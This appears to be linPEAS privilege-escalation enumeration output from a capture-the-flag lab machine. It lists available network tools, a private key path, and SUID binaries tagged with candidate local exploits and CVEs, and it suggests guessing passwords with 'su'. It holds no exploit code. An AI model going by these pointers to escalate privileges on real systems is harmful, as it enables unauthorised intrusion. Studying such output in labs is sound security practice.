reboot   system boot  Tue Nov  1 02:55:03 2022   still running                         0.0.0.0                                                                                                                                              
reboot   system boot  Thu Nov 12 05:08:40 2020 - Thu Nov 12 05:11:05 2020  (00:02)     0.0.0.0
vagrant  pts/0        Thu Nov 12 04:50:52 2020 - crash                     (00:17)     10.0.2.2
reboot   system boot  Thu Nov 12 04:50:21 2020 - Thu Nov 12 05:11:05 2020  (00:20)     0.0.0.0

wtmp begins Thu Nov 12 04:50:21 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                                                                                           
vagrant          pts/0    10.0.2.2         Thu Nov 12 04:50:52 +0000 2020

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                                                                                                                            
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                                                                            


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                                                                          
                             ╚══════════════════════╝                                                                                                                                                                                       
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                                                                             
/usr/bin/curl
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/usr/share/gcc-5                                                                                                                                                                                                                            

╔══════════╣ Searching mysql credentials and exec
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.18 (Ubuntu)                                                                                                                                                                                      
Server built:   2020-08-12T21:35:50
httpd Not Found
                                                                                                                                                                                                                                            
Nginx version: nginx Not Found
                                                                                                                                                                                                                                            
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Nov 12  2020 /etc/apache2/sites-enabled                                                                                                                                                                         
drwxr-xr-x 2 root root 4096 Nov 12  2020 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Nov 12  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Jul 15  2020 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Nov 12  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 70999 Oct  8  2020 /etc/php/7.0/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 70656 Oct  8  2020 /etc/php/7.0/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                                                          
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                                                                                        
drwxr-xr-x 2 root root 4096 Sep 25  2020 /etc/ldap


╔══════════╣ Searching ssl/ssh files
Port 22                                                                                                                                                                                                                                     
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
PasswordAuthentication yes
UsePAM yes

══╣ Possible private SSH keys were found!
/home/lennie/.config/lxc/client.key

══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem                                                                                                                                                                                                       
2052PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/doc/openssh-client/examples/sshd_config                                                                                                                                                                                          
AuthorizedKeysFile      .ssh/authorized_keys
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                                                                            


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Nov 12  2020 /etc/pam.d                                                                                                                                                                                         
-rw-r--r-- 1 root root 2133 May 26  2020 /etc/pam.d/sshd




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                                                                                                                                                      
tmux 2.1                                                                                                                                                                                                                                    


/tmp/tmux-1002
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3517 Aug 28  2020 /etc/cloud/cloud.cfg                                                                                                                                                                               
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Sep 25  2020 /usr/share/keyrings                                                                                                                                                                                
drwxr-xr-x 2 root root 4096 Sep 25  2020 /var/lib/apt/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                                                                              
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
-rw-r--r-- 1 root root 13996 Sep 25  2020 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 14076 Jun  3  2020 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 Jun  3  2020 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 2294 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring-removed.gpg
-rw-r--r-- 1 root root 2253 Nov  5  2017 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Nov  5  2017 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1227 Jun  3  2020 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2256 Feb 26  2016 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 12335 Sep 25  2020 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg



╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /usr/share/bash-completion/completions/postfix                                                                                                                                                      


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                                                                                                                            

-rw-r--r-- 1 root root 69 Oct  8  2020 /etc/php/7.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Oct  8  2020 /usr/share/php7.0-common/common/ftp.ini






╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc                                                                                                                                                                                  





-rw-r--r-- 1 root root 655 Jul 12  2019 /etc/skel/.profile






                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
strings Not Found                                                                                                                                                                                                                           
-rwsr-xr-x 1 root root 40K Jan 27  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                                     
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 27K Jan 27  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 40K Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 53K Mar 26  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 23K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 134K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 33K Mar 26  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 71K Mar 26  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K Mar 26  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 40K Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 33K Mar 26  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 74K Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 83K Apr  9  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 109K Sep  8  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 419K May 26  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /sbin/unix_chkpwd                                                                                                                                                                                 
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root utmp 425K Feb  7  2016 /usr/bin/screen  --->  GNU_Screen_4.5.0
-rwxr-sr-x 1 root shadow 61K Mar 26  2019 /usr/bin/chage
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root mlocate 39K Nov 18  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root tty 27K Jan 27  2020 /usr/bin/wall
-rwxr-sr-x 1 root ssh 351K May 26  2020 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 23K Mar 26  2019 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so                                                                                                                                                                    
/etc/ld.so.conf                                                                                                                                                                                                                             
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                                                             
Current env capabilities:                                                                                                                                                                                                                   
Current: =
Current proc capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr = cap_net_raw+ep

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3310 Apr 12  2016 sbin.dhclient                                                                                                                                                                                     
-rw-r--r-- 1 root root   125 Apr  9  2019 usr.bin.lxc-start
-rw-r--r-- 1 root root   281 Dec  7  2017 usr.lib.lxd.lxd-bridge-proxy
-rw-r--r-- 1 root root 26271 Sep  8  2020 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1527 Jan  5  2016 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1469 Sep  8  2017 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                                                                                                     
files with acls in searched folders Not Found                                                                                                                                                                                               
                                                                                                                                                                                                                                            
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                                                                                                  
/usr/bin/gettext.sh                                                                                                                                                                                                                         

╔══════════╣ Executable files potentially added by user (limit 70)
2022-11-01+03:53:54.8696999240 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service/init.scope/notify_on_release                                                                                                 
2022-11-01+03:53:54.8695438150 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service/init.scope/cgroup.clone_children
2022-11-01+03:53:54.8694460830 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service/init.scope/cgroup.procs
2022-11-01+03:53:54.8693410390 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service/init.scope/tasks
2022-11-01+03:53:54.8688106840 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service/cgroup.procs
2022-11-01+03:53:54.8686973610 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service/tasks
2022-11-01+03:53:54.6136117140 /var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
2022-11-01+03:53:54.6107403870 /var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
2022-11-01+03:53:54.6077844060 /var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
2022-11-01+03:53:54.6048301580 /var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
2022-11-01+03:53:54.6019178360 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
2022-11-01+03:53:54.5988655910 /var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
2022-11-01+03:53:54.5959072130 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
2022-11-01+03:53:54.5929086290 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
2022-11-01+03:53:54.5870559020 /var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
2022-11-01+03:53:54.5840432860 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
2022-11-01+03:53:54.5781122610 /var/lib/lxcfs/cgroup/memory/system.slice/cloud-config.service/cgroup.event_control
2022-11-01+03:53:54.5751351030 /var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
2022-11-01+03:53:54.5721430530 /var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
2022-11-01+03:53:54.5691508810 /var/lib/lxcfs/cgroup/memory/system.slice/snapd.apparmor.service/cgroup.event_control
2022-11-01+03:53:54.5663036770 /var/lib/lxcfs/cgroup/memory/system.slice/run-user-1002.mount/cgroup.event_control
2022-11-01+03:53:54.5633125940 /var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control
2022-11-01+03:53:54.5603335360 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
2022-11-01+03:53:54.5573425970 /var/lib/lxcfs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
2022-11-01+03:53:54.5544207260 /var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
2022-11-01+03:53:54.5514626730 /var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
2022-11-01+03:53:54.5484814210 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
2022-11-01+03:53:54.5454778630 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
2022-11-01+03:53:54.5425664420 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
2022-11-01+03:53:54.5396031190 /var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
2022-11-01+03:53:54.5366209850 /var/lib/lxcfs/cgroup/memory/system.slice/vsftpd.service/cgroup.event_control
2022-11-01+03:53:54.5336422340 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
2022-11-01+03:53:54.5307177220 /var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
2022-11-01+03:53:54.5277423860 /var/lib/lxcfs/cgroup/memory/system.slice/cloud-final.service/cgroup.event_control
2022-11-01+03:53:54.5246612790 /var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
2022-11-01+03:53:54.5216948850 /var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control
2022-11-01+03:53:54.5187600670 /var/lib/lxcfs/cgroup/memory/system.slice/cloud-init-local.service/cgroup.event_control
2022-11-01+03:53:54.5158114050 /var/lib/lxcfs/cgroup/memory/system.slice/cloud-init.service/cgroup.event_control
2022-11-01+03:53:54.5128683490 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
2022-11-01+03:53:54.5099622450 /var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control
2022-11-01+03:53:54.5070100880 /var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
2022-11-01+03:53:54.5040162830 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
2022-11-01+03:53:54.5010386620 /var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
2022-11-01+03:53:54.4981379970 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
2022-11-01+03:53:54.4951181210 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
2022-11-01+03:53:54.4921396320 /var/lib/lxcfs/cgroup/memory/system.slice/snapd.seeded.service/cgroup.event_control
2022-11-01+03:53:54.4891700210 /var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
2022-11-01+03:53:54.4862894320 /var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
2022-11-01+03:53:54.4833088610 /var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control
2022-11-01+03:53:54.4802922210 /var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
2022-11-01+03:53:54.4773074600 /var/lib/lxcfs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
2022-11-01+03:53:54.4744036230 /var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control
2022-11-01+03:53:54.4714281710 /var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control
2022-11-01+03:53:54.4684160700 /var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control
2022-11-01+03:53:54.4654091710 /var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
2022-11-01+03:53:54.4624485580 /var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control
2022-11-01+03:53:54.4594759290 /var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
2022-11-01+03:53:54.4565230080 /var/lib/lxcfs/cgroup/memory/system.slice/ifup@eth0.service/cgroup.event_control
2022-11-01+03:53:54.4535627790 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
2022-11-01+03:53:54.4506526350 /var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control
2022-11-01+03:53:54.4476458270 /var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
2022-11-01+03:53:54.4446704370 /var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
2022-11-01+03:53:54.4416980680 /var/lib/lxcfs/cgroup/memory/system.slice/virtualbox-guest-utils.service/cgroup.event_control
2022-11-01+03:53:54.4387742060 /var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
2022-11-01+03:53:54.4357778790 /var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
2022-11-01+03:53:54.4328496320 /var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control
2022-11-01+03:53:54.4299568380 /var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
2022-11-01+03:53:54.4270414050 /var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control
2022-11-01+03:53:54.4239720470 /var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
2022-11-01+03:53:54.4207681490 /var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control

╔══════════╣ Unexpected in root
/vagrant                                                                                                                                                                                                                                    
/recipe.txt
/vmlinuz.old
/vmlinuz
/incidents
/initrd.img
/initrd.img.old

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                                                                                                           
total 32                                                                                                                                                                                                                                    
drwxr-xr-x  2 root root 4096 Sep 25  2020 .
drwxr-xr-x 96 root root 4096 Nov 12  2020 ..
-rw-r--r--  1 root root  833 Sep  8  2020 apps-bin-path.sh
-rw-r--r--  1 root root  663 May 18  2016 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--  1 root root 1557 Apr 14  2016 Z97-byobu.sh
-rwxr-xr-x  1 root root  873 Aug 28  2020 Z99-cloudinit-warnings.sh
-rwxr-xr-x  1 root root 3417 Aug 28  2020 Z99-cloud-locale-test.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                                                                             
                                                                                                                                                                                                                                            
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                                                                                
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                                                                                
═╣ Can I read shadow files? ............. No                                                                                                                                                                                                
═╣ Can I read shadow plists? ............ No                                                                                                                                                                                                
═╣ Can I write shadow plists? ........... No                                                                                                                                                                                                
═╣ Can I read opasswd file? ............. No                                                                                                                                                                                                
═╣ Can I write in network-scripts? ...... No                                                                                                                                                                                                
═╣ Can I read root folder? .............. No                                                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                                                                      
/home/lennie/scripts
/home/lennie/scripts/startup_list.txt
/home/lennie/scripts/planner.sh
/home/lennie/Documents/note.txt
/home/lennie/Documents/concern.txt
/home/lennie/Documents/list.txt
/root/
/var/www

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/home/lennie                                                                                                                                                                                                                                
/home/lennie/Documents
/sys/fs/cgroup/systemd/user.slice/user-1002.slice/user@1002.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service

╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                                                                                                            
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log                                                                                                                                                                                                                           
/var/log/kern.log
/var/log/syslog
/home/lennie/scripts/startup_list.txt
/home/lennie/.config/lxc/client.crt
/home/lennie/.config/lxc/client.key
/home/lennie/.gnupg/gpg.conf
/home/lennie/.gnupg/pubring.gpg
/home/lennie/.gnupg/trustdb.gpg

logrotate 3.8.7

╔══════════╣ Files inside /home/lennie (limit 20)
total 28                                                                                                                                                                                                                                    
drwx------ 6 lennie lennie 4096 Nov  1 03:53 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
drwxr-x--- 3 lennie lennie 4096 Nov  1 03:53 .config
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwx------ 2 lennie lennie 4096 Nov  1 03:53 .gnupg
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt

╔══════════╣ Files inside others home (limit 20)
                                                                                                                                                                                                                                            
╔══════════╣ Searching installed mail applications
                                                                                                                                                                                                                                            
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                                                                            
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 128 Sep 25  2020 /var/lib/sgml-base/supercatalog.old                                                                                                                                                                 
-rw-r--r-- 1 root root 298 Nov  1 02:55 /run/blkid/blkid.tab.old
-rw-r--r-- 1 root root 610 Sep 25  2020 /etc/xml/catalog.old
-rw-r--r-- 1 root root 673 Sep 25  2020 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 0 Aug 29  2020 /usr/src/linux-headers-4.4.0-190-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Aug 29  2020 /usr/src/linux-headers-4.4.0-190-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 191098 Aug 29  2020 /usr/src/linux-headers-4.4.0-190-generic/.config.old
-rw-r--r-- 1 root root 35792 May  8  2018 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
-rwxr-xr-x 1 root root 226 Apr 14  2016 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 665 Apr 16  2016 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 10100 Sep 25  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 1496 Sep 25  2020 /usr/share/sosreport/sos/plugins/__pycache__/ovirt_engine_backup.cpython-35.pyc
-rw-r--r-- 1 root root 1758 Mar 24  2020 /usr/share/sosreport/sos/plugins/ovirt_engine_backup.py

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/mlocate/mlocate.db: regular file, no read permission                                                                                                                                                                         


╔══════════╣ Web files?(output limit)
                                                                                                                                                                                                                                            
╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 21 Nov  1 02:55 /run/cloud-init/.instance-id                                                                                                                                                                         
-rw-r--r-- 1 root root 2 Nov  1 02:55 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 root root 0 Nov  1 02:55 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 1391 Nov 12  2020 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 220 Aug 31  2015 /etc/skel/.bash_logout
-rw------- 1 root root 0 Sep 25  2020 /etc/.pwd.lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 2752 Nov 12  2020 /var/backups/apt.extended_states.0                                                                                                                                                                 

